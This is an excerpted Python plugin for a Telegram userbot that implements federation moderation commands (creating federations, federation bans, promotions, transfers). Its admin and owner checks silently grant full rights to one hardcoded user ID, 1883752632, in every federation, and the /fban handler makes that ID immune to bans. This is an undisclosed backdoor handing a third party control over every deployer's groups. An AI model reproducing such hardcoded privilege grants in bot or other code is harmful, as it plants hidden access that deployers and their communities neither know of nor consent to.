...
from userbot import assistant
import os, re, csv, json, time, uuid, pytz
from datetime import datetime
from io import BytesIO
import userbot.plugins.sql_helper.feds_sql as sql
...
def is_user_fed_admin(fed_id, user_id):
    ...
    if fed_admins is False:
        return False
    if int(user_id) in fed_admins or int(user_id) == OWNER_ID or int(user_id) == 1883752632:
        return True
    else:
        return False
...
def is_user_fed_owner(fed_id, user_id):
    ...
    if str(user_id) == getfedowner or int(user_id) == OWNER_ID or int(user_id) == 1883752632:
        return True
    else:
        return False
...
Fully Written by LEGENDX22
"""
@assistant.on(events.NewMessage(pattern="^/newfed ?(.*)"))
async def new(event):
...
@assistant.on(events.NewMessage(pattern="^/delfed"))
...
@assistant.on(events.CallbackQuery(pattern=r"rmfed(\_(.*))"))
...
@assistant.on(events.CallbackQuery(pattern=r"nada"))
async def delete_fed(event):
  await event.edit("Federation deletion canceled")

@assistant.on(events.NewMessage(pattern="^/renamefed ?(.*)"))
...
@assistant.on(events.NewMessage(pattern="^/chatfed"))
async def cf(event):
 chat = event.chat_id
 if event.is_private:
   return
...
@assistant.on(events.NewMessage(pattern="^/joinfed ?(.*)"))
async def jf(event):
 ...
 if not await is_admin(event, event.sender_id):
   ...
   return
 permissions = await assistant.get_permissions(event.chat_id, event.sender_id)
...
@assistant.on(events.NewMessage(pattern="^/leavefed"))
async def lf(event):
 if not event.is_group:
   return
 if not await is_admin(event, event.sender_id):
...
@assistant.on(events.NewMessage(pattern="^/fpromote ?(.*)"))
async def p(event):
 if event.is_private:
...
Fully Written by LEGENDX22
"""
@assistant.on(events.CallbackQuery(pattern=r"fkfed(\_(.*))"))
async def smex_fed(event):
  ...
  name = owner.strip()
  fed_id = fed_id.strip()
  rt = await assistant(GetFullUserRequest(int(user)))
...
Fully Written by LEGENDX22
"""
@assistant.on(events.CallbackQuery(pattern=r"smex(\_(.*))"))
async def smex(event):
  ...
  if event.sender_id == int(owner):
     rt = await assistant(GetFullUserRequest(int(owner)))
     fname = rt.user.first_name
...
@assistant.on(events.NewMessage(pattern="^/fdemote ?(.*)"))
async def fd(event):
 if event.is_private:
  return await event.reply("This command is made to be run in a group where the person you would like to promote is present.")
 fedowner = sql.get_user_owner_fed_full(event.sender_id)
 ...
 replied_user = await assistant(GetFullUserRequest(user_id))
 fname = replied_user.user.first_name
...
@assistant.on(events.NewMessage(pattern="^/fedinfo ?(.*)"))
async def info(event):
 ...
 if info:
  ...
  await assistant.send_message(event.chat_id, caption, buttons=buttons)


"""
Fully Written by LEGENDX22
"""
@assistant.on(events.CallbackQuery(pattern=r"fedadm(\_(.*))"))
async def smex_fed(event):
  if event.is_group:
    if not await is_admin(event, event.sender_id):
  ...
  try:
        ...
        owner = await assistant.get_entity(int(info["owner"]))
        try:
        ...
        for x in members:
          try:
            user = await assistant.get_entity(int(x))
...
Fully Written by LEGENDX22
"""
@assistant.on(events.NewMessage(pattern="^/fban ?(.*)"))
async def _(event):
    ...
    if not event.reply_to_msg_id:
     ...
     if not iid.isnumeric():
        entity = await assistant.get_input_entity(iid)
        try:
        ...
        r_sender_id = int(iid)
     try:
        replied_user = await assistant(GetFullUserRequest(r_sender_id))
        fname = replied_user.user.first_name
        ...
        if input:
          ...
          reason = None
        r_sender_id = iid
    if r_sender_id == BOT_ID or r_sender_id == OWNER_ID or r_sender_id == 1883752632:
...
Fully Written by LEGENDX22
"""
@assistant.on(events.NewMessage(pattern="^/unfban ?(.*)"))
...
@assistant.on(events.NewMessage(pattern="^/setfedlog ?(.*)"))
async def log(event):
 chat = event.chat_id
...
@assistant.on(events.NewMessage(pattern="^/unsetfedlog"))
...
"""
@assistant.on(events.NewMessage(pattern="^/subfed ?(.*)"))
async def sub(event):
 args = event.pattern_match.group(1)
 fedowner = sql.get_user_owner_fed_full(event.sender_id)
 if not fedowner:
...
@assistant.on(events.NewMessage(pattern="^/unsubfed ?(.*)"))
...
@assistant.on(events.NewMessage(pattern="^/(fstat|fbanstat) ?(.*)"))
...
@assistant.on(events.NewMessage(pattern="^/fedexport$"))
async def fex(event):
 if event.is_group:
  fed_id = sql.get_fed_id(event.chat_id)
  if not fed_id:
...
@assistant.on(events.NewMessage(pattern="^/(ftransfer|fedtransfer) ?(.*)"))
async def ft(event):
 fedowner = sql.get_user_owner_fed_full(event.sender_id)
 if not fedowner:
        return await event.reply("It doesn't look like you have a federation yet!")
...
@assistant.on(events.NewMessage(pattern="^/feddemoteme ?(.*)"))
async def fd(event):
 if not event.is_private:
...
@assistant.on(events.NewMessage(pattern="^/myfeds"))
async def sk(event):
 if not event.is_private:
  return await event.reply("This command is made to be used in PM.")
 fedowner = sql.get_user_owner_fed_full(event.sender_id)
